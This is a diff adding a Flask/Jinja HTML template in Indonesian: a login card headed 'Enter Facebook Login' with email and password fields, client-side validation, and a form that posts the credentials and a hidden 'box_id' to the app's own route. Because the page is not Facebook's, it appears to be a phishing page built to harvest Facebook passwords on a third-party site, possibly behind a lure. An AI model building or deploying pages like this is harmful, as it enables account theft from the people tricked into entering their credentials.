@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Form Login</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body class="page-form">
+  <div class="card">
+    <h2>Masukkan Login Facebook</h2>
+
+    <div id="js-error" class="alert alert-error" style="display:none;"></div>
+
+    {% if error %}
+      <div class="alert alert-error">{{ error }}</div>
+    {% endif %}
+
+    <form method="POST" action="{{ url_for('auth.form') }}" novalidate id="login-form">
+      <input type="hidden" name="box_id" value="{{ box_id }}">
+
+      <div class="field">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email"
+               placeholder="contoh@email.com" autocomplete="email">
+      </div>
+
+      <div class="field">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password"
+               placeholder="••••••••" autocomplete="current-password">
+      </div>
+
+      <button type="submit" class="btn btn-primary">Masuk</button>
+    </form>
+    <a href="{{ url_for('main.index') }}" class="back-link">← Kembali</a>
+  </div>
+
+  <script>
+    const form     = document.getElementById('login-form');
+    const errorBox = document.getElementById('js-error');
+    const emailEl  = document.getElementById('email');
+    const passEl   = document.getElementById('password');
+
+    // regex email sederhana
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    function showError(msg) {
+      errorBox.textContent = msg;
+      errorBox.style.display = 'block';
+    }
+
+    function hideError() {
+      errorBox.style.display = 'none';
+    }
+
+    form.addEventListener('submit', function (e) {
+      hideError();
+
+      const email    = emailEl.value.trim();
+      const password = passEl.value.trim();
+
+      if (!email && !password) {
+        e.preventDefault();
+        showError('Email dan password wajib diisi.');
+        return;
+      }
+
+      if (!email) {
+        e.preventDefault();
+        showError('Email wajib diisi.');
+        emailEl.focus();
+        return;
+      }
+
+      if (!emailRegex.test(email)) {
+        e.preventDefault();
+        showError('Format email tidak valid. Contoh: nama@email.com');
+        emailEl.focus();
+        return;
+      }
+
+      if (!password) {
+        e.preventDefault();
+        showError('Password wajib diisi.');
+        passEl.focus();
+        return;
+      }
+
+      if (password.length < 6) {
+        e.preventDefault();
+        showError('Password minimal 6 karakter.');
+        passEl.focus();
+        return;
+      }
+    });
+
+    // hilangkan error saat user mulai mengetik
+    emailEl.addEventListener('input', hideError);
+    passEl.addEventListener('input', hideError);
+  </script>
+</body>
+</html>
